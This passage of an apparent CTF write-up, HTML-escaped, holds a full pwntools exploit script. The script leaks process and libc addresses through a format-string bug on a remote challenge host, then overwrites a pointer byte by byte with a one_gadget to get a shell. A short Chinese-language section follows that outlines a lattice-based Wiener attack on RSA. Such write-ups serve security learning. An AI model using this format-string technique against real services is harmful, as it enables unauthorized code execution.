&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;182.92.203.154&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;35264&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./libc-2.23.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fg %12$p&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x203169&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Proc:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;



&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;fg %174$s&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;U&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2030B8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7F&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;getopt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LIBC:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;


&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;fg %&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x45226&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;c%174$hhn&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;U&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2030C8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;fg %&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x45226&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;c%174$hhn&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;U&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2030C8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;fg %&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x45226&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;c%174$hhn&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;U&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2030C8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;fg %&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x45226&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;c%174$hhn&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;U&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2030C8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;fg %&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x45226&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;c%174$hhn&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;U&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2030C8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;fg %&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x45226&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;c%174$hhn&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;U&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2030C8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;quit&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
&lt;h3 id=&#34;common&#34;&gt;common&lt;/h3&gt;
&lt;p&gt;$$
W_i : e_i d_i g − k_i N = g − k_i s \ 
G_{i,j} : k_i d_j e_j − k_j d_i e_i = k_i − k_j
$$&lt;/p&gt;
&lt;p&gt;则 $k_1 k_2 = k_1 k_2, k_2 W_1, g G_{1,2}, W_1 W_2$ 转化成矩阵形式, 有 $x B = v$, 其中&lt;/p&gt;
&lt;p&gt;$$
x = (k_1 k_2, k_2 d_1 g, k_1 d_2 g, d_1 d_2 g^2 )\&lt;br&gt;
$$&lt;/p&gt;
&lt;p&gt;$$
B = \begin{bmatrix} 1 &amp;amp; −N &amp;amp; 0 &amp;amp; N^2 \&lt;br&gt;
&amp;amp; e_1 &amp;amp; −e_1 &amp;amp; −e_1 N \&lt;br&gt;
&amp;amp; &amp;amp; e_2 &amp;amp; −e_2 N \&lt;br&gt;
&amp;amp; &amp;amp; &amp;amp; e_1 e_2 \end{bmatrix} \&lt;br&gt;
$$&lt;/p&gt;
&lt;p&gt;$$
v = ( k_1 k_2, k_2 (g − k_1 s), g(k_1 − k_2 ), (g − k_1 s)(g − k_2 s) )
$$&lt;/p&gt;
&lt;p&gt;令 $D = diag(N, N^{1/2}, N^{1+δ}, 1)$, 使其满足 Minkowski’s bound, 有 $||vD|| &amp;lt; vol(L) = |det(B) det(D)|$​ 即 $N^{2(1/2+δ)} &amp;lt; 2N^{(13/2+δ)/4}$, $\delta &amp;lt; 5/14 - \epsilon$.&lt;/p&gt;
&lt;p&gt;利用 LLL 求出最短向量 $vD$, 进而求出 $x$, 根据 Wiener’s attack,&lt;/p&gt;
&lt;p&gt;$\phi(N) = g(ed-1)/k = floor(edg/k)$&lt;/p&gt;
&lt;p&gt;有了 $\phi(N)$ 即可构造一元二次方程分解 $N$.&lt;/p&gt;
&lt;p&gt;由于不知道 d 的 bit_length，所以在 d 的范围数量级内进行枚举.&lt;/p&gt;
